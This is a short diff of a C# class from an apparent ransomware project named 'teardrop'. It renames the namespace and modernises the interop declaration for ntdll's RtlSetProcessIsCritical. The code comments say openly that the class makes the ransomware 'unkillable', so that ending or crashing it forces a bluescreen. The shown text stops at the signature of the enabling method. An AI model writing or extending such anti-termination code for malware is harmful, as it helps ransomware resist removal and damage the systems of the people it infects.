+++ teardrop/teardrop/Classes/ProcessMananger.cs
@@ -1,17 +1,16 @@
-﻿using System;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace takecare
+namespace teardrop
 {
     // The folllowing class is used to make the process "unkillable".
     // By calling "Make.ProcessUnkillable();" the process enters a debug mode
     // and sets itself to a critical process. This means when the ransomware is
     // terminated or crashes, it will cause a bluescreen.
-    public class ProcessMananger
+    public partial class ProcessMananger
     {
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+        [LibraryImport("ntdll.dll", SetLastError = true)]
+        private static partial void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
 
         // Enabled the "unkillable" feature
         public static void ProcessUnkillable()
